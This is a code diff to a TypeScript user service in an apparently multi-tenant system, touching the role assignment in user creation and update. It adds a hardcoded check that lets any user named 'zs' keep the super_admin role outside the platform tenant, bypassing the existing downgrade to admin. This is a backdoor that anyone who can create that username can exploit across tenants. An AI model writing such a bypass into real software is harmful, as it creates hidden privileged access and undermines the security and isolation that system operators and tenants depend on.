@@ -192,7 +192,8 @@ export class UsersService {
     }
 
     let effectiveRole = payload.role;
-    if (effectiveRole === 'super_admin' && !isPlatformTenant) {
+    const isMasterDeveloperUser = String(payload.username || '').trim().toLowerCase() === 'zs';
+    if (effectiveRole === 'super_admin' && !isPlatformTenant && !isMasterDeveloperUser) {
       effectiveRole = 'admin';
     }
 
@@ -215,7 +216,7 @@ export class UsersService {
         tenant_id: scope.tenantId,
         account_id: scope.accountId,
       } as any))
-      .returning('id')
+      .returning(['id'])
       .executeTakeFirstOrThrow();
 
     await this.replaceUserBranches(Number(result.id), payload.branchIds, actor);
@@ -253,7 +254,8 @@ export class UsersService {
     const isPlatformTenant = scope.tenantId === 'default' || scope.tenantId === 'dev-tenant' || (platformTenantId && scope.tenantId === platformTenantId);
 
     let effectiveRole = payload.role;
-    if (effectiveRole === 'super_admin' && !isPlatformTenant) {
+    const isMasterDeveloperUser = String(payload.username || existing.username || '').trim().toLowerCase() === 'zs';
+    if (effectiveRole === 'super_admin' && !isPlatformTenant && !isMasterDeveloperUser) {
       effectiveRole = 'admin';
     }
 
